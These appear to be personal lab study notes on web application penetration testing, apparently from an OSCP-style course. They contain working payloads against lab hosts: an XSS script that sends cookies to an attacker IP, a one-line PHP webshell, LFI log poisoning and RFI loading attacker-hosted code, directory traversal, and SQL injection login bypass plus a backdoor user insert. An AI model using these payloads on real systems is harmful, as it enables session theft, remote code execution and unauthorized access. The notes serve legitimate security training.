#Gather Info:
1 What does the application do?
2 What language is it written in? 
3 What server software is the application running on? etc.

#Web App Enumeration:
1 Programming language and frameworks
2 Web server software
3 Database software
4 Server operating system

#WebApp Assesment Tools

# DIRB

dirb http://www.site.com -r -z 10     # -r scan non recursively // -z 10 - add 10 milsec delay to each request

# BURP SUITE..,

# NIKTO   #NOT stealth!!!   // for low hanging fruits // up to several hours to finish the scan
-T  #specify what tests to perform
nikto -host=http://www.site.com -maxtime=30s    # finish after 30 seconds

# Exploiting Web-Based Vulnerabilities

## Exploiting Admin Consoles    #PRIME Target!
### Intruder --> OPtions --> Grep - Extract
PitchFork
select values to extract from previous response and import them into our next request --> ok // select all values needed
select "Payloads" for each position
for our greps --> select number payload, then "Recursive grep", and select from our greps
and set "initial payload for first request" ex: 0123456789
if the value contain special characters, we must deselect the checkbox "URL-encode these characters"

### SQLi
select * from webappdb.users      #show users table from webappdb (usernames and passwords for example)
insert into webappdb.users(password, username) VALUES ('backdoor','backdoor');    # insert new user and password

# XSS
- identify entry point / ex: comment section
- check if special characters are sanitized or not / ex: write as comment - hello ";<>
# basic XSS
try - <scriot>alert('XSS')</script>
#Content Injection
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
next start listener on our attack machine - sudo nc -lvnp 80 - and visit the comment page - we see in our nc the request from our target
# Stealing Cookies and Sessions
- set our netcat -> sudo nc -lvnp 80
- use XSS payload on comment section:
<script>new Image().src="http://10.11.0.4OurAttackMachineIP/cool.jpg?output="+document.cookie;</script>
- on the target we'll use script to simulate admin login. In cmd write:
powershell -ExecutionPolicy Bypass -File admin_login.ps1    #script loging in and out, run from cmd and using powershell with executionpolicy bypass to temporarily use unsigned scripts

#9.4.3 Directory Traversal / Path Traversal Vulns   #This vulnerability occurs when input is poorly validated, subsequently granting an attacker the ability to manipulate file paths with “../” or “..\” characters.
## Identifying and Exploiting Dir Travesal Vulns    #search for /etc/passwd on linux or c:\boot.ini in win
# we can target on Win - c:\windows\system32\drivers\etc\hosts file
- in the vulnerable URL 10.11.0.22/menu.php?file=current_menu.php --> http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts  --> print the content of the hosts file     ## we can read files, including those outside of the web root directory
## File Inclusion Vulns     #not only we can read as in Dir Traversal, but we can icnlude files into the app's running code // write shell somewhere
### Identify R/LFI vulns    // RFI easyer to Exploit than LFI
#### Exploit LFI
- one way is to contaminate log files and the LFI ex:to execute php code
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>     #php code // pre - preserve any linebreaks or formatting in a results that a function call // function call -> shell_exec --> executes OS command // OS command is retrieved by from cmd parameter in GET request /// one line php code let us specify an OS command via HTTP query and output the result in our browser
#in the exercise the payload is in the log file, despite the bad HTTP request, so we can perform LFI Code Execution
## LFI Code Execution 
# from the previous Dir Traversal Example, we exploit:
10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig

## RFI    # php apps must be cofigured --> URL include, set to "ON" //older php default is "ON", newer are "OFF"
- start listenr - sudo nc -lvnp 80
-in the URL:
# start apache server hosting our evil.txt
10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt    # on our listener we see GET /evil.txt
#
cat /var/www/html/evil.txt --> <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
sudo systemctl start apache2
# exploit RFI:
10.11.0.22/menu.php?file=http://10.11.0.4.evil.txt&cmd=ipconfig   #same results as LFI before   #very simple webshell!

# Expand Our Repertoire
## Create HTTP Servers on Kali:
apache --> sudo service apache2 start /or/ sudo /etc/init.d/apache2 start /or/ sudo systemctl start apache2.service
python -m SimpleHTTPServer 7331
python3 -m http.server 7331
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000    # . for current directory
busybox httpd -f -p 10000       # -f - run interactively

# PHP Wrappers    #inj php through LFI # we can use this filters when we can't poison local files with php code!
http://10.11.0.22/menu.php?file=data:text/plain,hello world
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

# SQL injections
SELECT * FROM users;
SELECT username FROM users WHERE id=1;
## Identify SQL Injection Vulnerabilities     # try ' and if there is an error --> most likely vulnerable
- Vulnerable Code
$query = "select * from users where username = '$user' and password = '$pass'";
- with using ' an error may be appear:
$query = "select * from users where username =''' and password = 'password123' ";   # wrong syntax //Wr0ngSynH4X
## Authentication Bypass
- normal login:
select * from users where name = 'tom' and password = 'jones';
- Bypass:
select * from users where name = 'tom' or 1=1;#' and password = 'jones';  # the server reads only --> select * from users where name = 'tom' or 1=1;    ## all rows will be returned!
- Some programming languages have functions that query the database and expect a single record. If these functions get more than one row, they will generate an error.
- if there is limitation of one raw, we can use:
select * from users where name = 'tom' or 1=1 LIMIT 1;#

# Enumerate the DB








































